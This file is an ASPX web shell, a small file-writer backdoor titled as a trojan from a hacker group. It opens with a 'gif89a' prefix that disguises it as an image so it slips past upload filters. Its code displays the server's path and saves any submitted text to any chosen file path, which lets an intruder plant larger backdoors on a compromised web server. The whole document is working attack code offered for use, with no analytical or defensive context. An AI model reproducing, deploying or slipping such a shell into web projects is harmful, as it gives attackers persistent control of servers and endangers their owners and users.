gif89a<%@ Page language="c#" validateRequest=false %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
 <HEAD>
 <title>ASPX小马 - 黑兵社团</title>
 <meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
 <meta content="C#" name="CODE_LANGUAGE">
 <meta content="JavaScript" name="vs_defaultClientScript">
 <meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
 <script language="C#" runat="server">

void Page_Load(object sender, System.EventArgs e)
 {
 string strPath = Server.MapPath(".");
 L3.Text = strPath;
 }

void Button1_Click(object sender, System.EventArgs e)
 {
 try
 {
 System.IO.FileInfo fil = new System.IO.FileInfo(T1.Text);
 System.IO.StreamWriter sw = fil.CreateText();
 sw.Write(T2.Text);
 sw.Flush();
 sw.Close();
 L4.Text = "文件保存成功!";
 }

 catch(Exception ex)
 {
 L4.Text = ex.Message;
 }
 }
 </script>
 </HEAD>
 <body MS_POSITIONING="GridLayout">
 <form id="Form1" method="post" runat="server">
 <asp:Label id="L1" style="Z-INDEX: 101; LEFT: 24px; POSITION: absolute; TOP: 96px" runat="server">本文件绝对路径:</asp:Label>
 <asp:TextBox id="T1" style="Z-INDEX: 102; LEFT: 144px; POSITION: absolute; TOP: 64px" runat="server"
 Width="376px"></asp:TextBox>
 <asp:Label id="L2" style="Z-INDEX: 103; LEFT: 24px; POSITION: absolute; TOP: 64px" runat="server">文件保存路径:</asp:Label>
 <asp:Label id="L3" style="Z-INDEX: 104; LEFT: 144px; POSITION: absolute; TOP: 96px" runat="server"
 Width="584px"></asp:Label>
 <asp:TextBox id="T2" style="Z-INDEX: 105; LEFT: 24px; POSITION: absolute; TOP: 128px" runat="server"
 Width="504px" Height="344px" TextMode="MultiLine"></asp:TextBox>
 <asp:Button id="Button1" style="Z-INDEX: 106; LEFT: 424px; POSITION: absolute; TOP: 504px" runat="server"
 Width="96px" Text="保存文件" OnClick="Button1_Click"></asp:Button>
 <asp:Label id="L4" style="Z-INDEX: 107; LEFT: 144px; POSITION: absolute; TOP: 24px" runat="server"
 Width="432px"></asp:Label></form>
 </body>
</HTML>